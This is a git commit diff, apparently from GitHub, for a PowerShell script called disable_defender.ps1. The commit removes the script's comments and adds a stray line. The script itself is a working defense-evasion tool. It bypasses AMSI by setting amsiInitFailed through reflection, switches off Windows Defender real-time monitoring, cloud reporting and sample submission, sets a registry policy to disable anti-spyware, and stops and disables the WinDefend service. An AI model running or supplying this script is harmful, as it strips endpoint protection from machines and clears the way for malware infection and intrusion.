65a795182a316f4d15411ddcc21d4c2b4d1b288e
v-0v <108912188+v-0v@users.noreply.github.com>
2024-09-28 13:55:15 +0300

    Update disable_defender.ps1

--- disable_defender.ps1
+++ disable_defender.ps1
@@ -1,20 +1,14 @@
-# AMSI Bypass
 $s = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'amsiInitFailed'
 If (-Not $s) {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'amsiInitFailed' = $true}
 
-# Disable Windows Defender in real-time
 Set-MpPreference -DisableRealtimeMonitoring $true
-
-# Disable Windows Defender cloud protection and sample submission
+n
 Set-MpPreference -MAPSReporting Disabled
 Set-MpPreference -SubmitSamplesConsent 2
 
-# Disable Windows Defender via Registry
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
 
-# Stop and disable Windows Defender service
 Stop-Service -Name WinDefend -Force
 Set-Service -Name WinDefend -StartupType Disabled
 
-# Confirmation message
 Write-Host "Windows Defender has been disabled."
